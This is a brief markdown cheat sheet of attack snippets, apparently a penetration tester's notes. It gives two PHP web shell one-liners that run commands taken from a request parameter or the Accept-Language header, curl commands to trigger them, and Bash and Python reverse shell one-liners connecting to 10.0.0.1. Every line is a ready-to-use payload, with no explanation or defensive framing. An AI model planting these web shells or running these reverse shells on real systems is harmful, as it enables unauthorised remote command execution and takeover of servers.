# simple shell using get
    <?php system($_REQUEST['c']); ?>
then 
    `curl http://example.com?c=whoami`

# simple shell using http header
    <?php passthru(getenv('HTTP_ACCEPT_LANGUAGE')); ?>
then `curl http://example.com -H "Accept-Language: command"`

Make sure commands are URL encoded

# Reverse shell commands
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
## Bash
    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
## Python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
